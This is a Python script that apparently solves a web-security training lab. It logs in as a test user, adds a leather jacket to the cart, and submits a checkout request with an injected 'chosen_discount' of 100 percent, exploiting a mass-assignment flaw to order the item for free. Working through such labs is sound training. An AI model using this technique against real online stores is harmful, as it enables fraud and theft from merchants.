import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

# add the jacket to cart
lab.info("Adding jacket to cart...")
lab.post("/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1})

# GET /api/checkout reveals the order structure including chosen_discount
# the server accepts this field in the POST request too (mass assignment)
# setting percentage to 100 gives a full discount
lab.info("Checking out with 100% discount via mass assignment...")
resp = lab.session.post(
    lab.url("/api/checkout"),
    json={
        "chosen_discount": {"percentage": 100},
        "chosen_products": [
            {
                "product_id": "1",
                "name": "Lightweight \"l33t\" Leather Jacket",
                "quantity": 1,
                "item_price": 133700,
            }
        ],
    },
)

if resp.status_code == 201:
    lab.success(f"Order placed: {resp.text}")
else:
    lab.warn(f"Checkout returned status {resp.status_code}: {resp.text}")

lab.check_solved()
